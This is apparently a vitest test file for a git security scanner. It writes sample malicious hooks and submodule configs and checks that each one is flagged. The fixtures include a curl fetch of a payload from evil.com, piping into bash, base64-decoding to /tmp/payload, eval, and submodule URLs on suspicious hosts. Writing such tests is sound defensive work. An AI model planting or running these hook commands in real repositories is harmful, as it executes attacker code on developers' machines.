import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scanGitSecurity, GIT_HOOK_PATTERNS, GITMODULE_PATTERNS } from "../git-scanner.js";

describe("Git Scanner", () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(process.env.TEMP ?? "/tmp", "scg-git-"));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function createGitHook(hookName: string, content: string) {
    const hooksDir = path.join(tmpDir, ".git", "hooks");
    fs.mkdirSync(hooksDir, { recursive: true });
    fs.writeFileSync(path.join(hooksDir, hookName), content);
  }

  function createGitModules(content: string) {
    fs.writeFileSync(path.join(tmpDir, ".gitmodules"), content);
    // Also need .git dir to exist
    fs.mkdirSync(path.join(tmpDir, ".git"), { recursive: true });
  }

  it("should detect curl in git hooks", () => {
    createGitHook("post-merge", "#!/bin/sh\ncurl https://evil.com/payload.sh");
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_DOWNLOAD")).toBe(true);
  });

  it("should detect eval in git hooks", () => {
    createGitHook("pre-commit", '#!/bin/sh\neval "$(some_command)"');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_EXEC")).toBe(true);
  });

  it("should detect base64 in git hooks", () => {
    createGitHook("pre-push", '#!/bin/sh\necho "encoded" | base64 -d > /tmp/payload');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_ENCODED")).toBe(true);
  });

  it("should detect pipe to shell in git hooks", () => {
    createGitHook("post-checkout", "#!/bin/sh\necho code | bash");
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_HOOK_PIPE_SHELL")).toBe(true);
  });

  it("should skip .sample hooks", () => {
    createGitHook("pre-commit.sample", '#!/bin/sh\ncurl https://example.com');
    const findings = scanGitSecurity(tmpDir);
    expect(findings).toHaveLength(0);
  });

  it("should detect HTTP submodule URLs", () => {
    createGitModules('[submodule "lib"]\n\tpath = lib\n\turl = http://evil.com/lib.git');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_SUBMODULE_HTTP")).toBe(true);
  });

  it("should detect suspicious submodule URLs", () => {
    createGitModules('[submodule "lib"]\n\tpath = lib\n\turl = https://sketchy-host.ru/lib.git');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_SUBMODULE_SUSPICIOUS")).toBe(true);
  });

  it("should not flag github.com submodule URLs", () => {
    createGitModules('[submodule "lib"]\n\tpath = lib\n\turl = https://github.com/org/repo.git');
    const findings = scanGitSecurity(tmpDir);
    expect(findings.some((f) => f.rule === "GIT_SUBMODULE_SUSPICIOUS")).toBe(false);
  });

  it("should return empty for directory without .git", () => {
    const findings = scanGitSecurity(tmpDir);
    expect(findings).toHaveLength(0);
  });

  it("should include line numbers for hooks", () => {
    createGitHook("pre-commit", "#!/bin/sh\n# comment\ncurl https://evil.com/x");
    const findings = scanGitSecurity(tmpDir);
    expect(findings.find((f) => f.rule === "GIT_HOOK_DOWNLOAD")?.line).toBe(3);
  });

  it("should have pattern arrays", () => {
    expect(GIT_HOOK_PATTERNS.length).toBeGreaterThan(2);
    expect(GITMODULE_PATTERNS.length).toBeGreaterThan(0);
  });
});
